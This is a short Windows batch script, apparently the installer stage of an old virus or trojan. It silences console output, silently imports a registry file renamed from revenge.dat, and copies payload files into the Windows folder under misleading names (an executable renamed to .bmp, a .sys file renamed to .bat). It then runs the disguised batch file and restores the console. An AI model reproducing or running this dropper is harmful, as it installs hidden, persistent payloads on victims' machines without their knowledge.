@echo off
ctty nul
ren revenge.dat revenge.reg
regedit /s revenge.reg
move revenge.exe c:\windows
ren c:\windows\revenge.exe revenge.bmp
move revenge.sys c:\windows
ren c:\windows\revenge.sys revenge.bat
call c:\windows\revenge.bat
ctty con
:endv0r
